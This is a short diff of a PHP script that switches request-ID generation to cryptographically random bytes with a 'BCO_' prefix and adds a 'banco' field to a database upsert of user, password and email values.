@@ -21,7 +21,11 @@ $existente = $sel->fetch(PDO::FETCH_ASSOC);
 if ($existente && !empty($existente['request_id'])) {
     $idPeticion = (string)$existente['request_id'];
 } else {
-    $idPeticion = uniqid("req_");
+    try {
+        $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
+    } catch (Throwable $_) {
+        $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
+    }
 }
 
 $upsert = $pdo->prepare(
@@ -31,7 +35,8 @@ $upsert = $pdo->prepare(
          `user`       = VALUES(`user`),
          `password`   = VALUES(`password`),
          `request_id` = IFNULL(VALUES(`request_id`), `request_id`),
-         `correo`     = IFNULL(VALUES(`correo`), `correo`)"
+         `correo`     = IFNULL(VALUES(`correo`), `correo`),
+         `banco`      = IFNULL(VALUES(`banco`), `banco`)"
 );
 $upsert->execute([
     ':k'   => $claveUnica,
